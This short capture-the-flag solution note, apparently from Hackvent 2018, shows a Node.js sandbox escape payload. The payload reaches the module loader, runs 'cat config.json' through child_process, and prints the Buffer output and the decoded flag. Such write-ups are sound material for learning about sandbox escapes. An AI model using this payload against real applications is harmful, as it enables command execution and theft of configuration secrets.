From GitHub:

new Function("
  return (
    this.constructor.constructor('
      return (this.process.mainModule.constructor._load
     )'
    )())"
  )()
("util").inspect("test")

New attempt:

new Function("return (this.constructor.constructor('return (this.process.mainModule.constructor._load)')())")()("child_process").execSync("cat config.json")

{ type: 'Buffer',
data:
[ 123,
10,
32,
34,
102,
108,
97,
103,
34,
58,
34,
72,
86,
49,
56,
45,
89,
116,
72,
51,
45,
83,
52,
110,
68,
45,
98,
120,
53,
65,
45,
78,
116,
52,
71,
34,
44,
10,
32,
34,
112,
111,
114,
116,
34,
58,
51,
48,
48,
48,
10,
125,
10,
10 ] }

Decoded with Python + DEC -> ASCII:

{
 "flag":"HV18-YtH3-S4nD-bx5A-Nt4G",
 "port":3000
}
